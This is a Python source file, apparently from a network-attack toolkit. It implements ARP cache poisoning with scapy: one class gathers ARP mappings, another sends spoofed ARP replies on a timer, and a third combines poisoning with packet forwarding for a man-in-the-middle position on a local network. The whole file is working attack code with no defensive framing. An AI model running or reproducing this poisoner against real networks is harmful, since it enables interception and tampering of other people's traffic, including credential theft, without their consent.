# coding: utf-8
from .forward import ForwarderModule
from .sniffer import Module
from . import net
import scapy.all as scapy
import threading
import time
import logging

logger = logging.getLogger(__name__)

class ArpCacheModule(Module):
    """
    ArpCacheModule provides a cache of the ARP associations provided by other hosts.
    It ignores ARP messages sent from this host and any other hosts specified in ``ignore``.
    """
    def __init__(self, ignore=None):
        self.sniffer = None
        self.ignore = set() if ignore is None else set(ignore)
        self.cache = {}

    def start(self, sniffer):
        self.sniffer = sniffer
        if self.sniffer.iface is not None:
            self.ignore.add(str(net.ifhwaddr(self.sniffer.iface)))

    def process(self, pkt):
        if scapy.Ether in pkt and scapy.ARP in pkt:
            src = pkt[scapy.Ether].src
            if src != '00:00:00:00:00:00' and src not in self.ignore:
                psrc = pkt[scapy.ARP].psrc
                if psrc != '0.0.0.0':
                    self.cache[psrc] = src

class ArpPoisonerModule(Module):
    """
    ArpPoisonerModule will send out spoofed ARP messages at regular intervals to poison the network.
    It also starts by sending out an arping to all targets to see who is on the network and populate the cache.
    """
    def __init__(self, arpcache, iface=None, hwaddr=None, target=None, impersonate=None, interval=1):
        self.arpcache = arpcache
        self.iface = iface
        self.interval = interval
        self.hwaddr = hwaddr
        self.target = target
        self.impersonate = impersonate

        self.sniffer = None

        self._stopevent = threading.Event()
        self._thread = None

    @staticmethod
    def enumerate(net):
        if isinstance(net, str):
            net = scapy.Net(net)
        return net

    def arping(self, target=None):
        # Figure out who we are trying to resolve
        if target is None:
            if self.target is None or self.impersonate is None:
                pdst = net.ifcidr(self.iface)
            else:
                # It has to be a list because scapy can be really cool, but also kinda wonky
                pdst = list(set(self.enumerate(self.target)) | set(self.enumerate(self.target)))
        else:
            pdst = target

        # Send out an arp "who-has" requests
        pkts = scapy.Ether(src=self.hwaddr, dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(op='who-has', hwsrc=self.hwaddr, pdst=pdst)
        scapy.sendp(pkts, iface=self.iface)

    def arpoison(self, target=None, impersonate=None):
        # Chose the target and impersonation lists
        impersonate = impersonate or self.impersonate or net.ifcidr(self.iface)
        target = target or self.target or net.ifcidr(self.iface)
        ifaddr = str(net.ifaddr(self.iface))

        # Filter out targets and impersonations not in our ARP cache
        pdst = [ip for ip in self.enumerate(target) if ip in self.arpcache]
        psrc = [ip for ip in self.enumerate(impersonate) if ip in self.arpcache]

        if pdst:
            # Build the packet list and filter out packets that would be sent to the true ip owner
            pkts = [scapy.Ether(src=self.hwaddr, dst=self.arpcache[ip])/scapy.ARP(op=['who-has', 'is-at'], hwsrc=self.hwaddr, psrc=psrc, pdst=ip) for ip in pdst]
            pkts = [p for p in pkts if p.psrc != p.pdst and p.dst != ifaddr]

            # Launch the payload
            scapy.sendp(pkts, iface=self.iface)

    def run(self):
        if self.hwaddr is None:
            self.hwaddr =  str(net.ifhwaddr(self.iface))

        self.arping()
        while not self._stopevent.is_set():
            self.arpoison()
            time.sleep(self.interval)

    def start(self, sniffer):
        self._stopevent.clear()
        self.sniffer = sniffer
        if self.iface is None:
            self.iface = self.sniffer.iface

        if self._thread is None or not self._thread.is_alive():
            self._thread = threading.Thread(target=self.run, daemon=True)
            self._thread.start()

    def stop(self):
        self._stopevent.set()

class ArpMitmModule(Module):
    def __init__(self, filter=None, iface=None, hwaddr=None):
        self.cache = ArpCacheModule(ignore=[hwaddr])
        self.poisoner = ArpPoisonerModule(self.cache.cache, iface=iface, hwaddr=hwaddr)
        self.forwarder = ForwarderModule(self.cache.cache, filter=filter, iface=iface, hwaddr=hwaddr)
        self.submodules = (self.cache, self.poisoner, self.forwarder)
        self.sniffer = None

    def start(self, sniffer):
        self.sniffer = sniffer
        for mod in self.submodules:
            mod.start(sniffer)

    def process(self, pkt):
        for mod in self.submodules:
            mod.process(pkt)

    def stop(self):
        for mod in self.submodules:
            mod.stop()
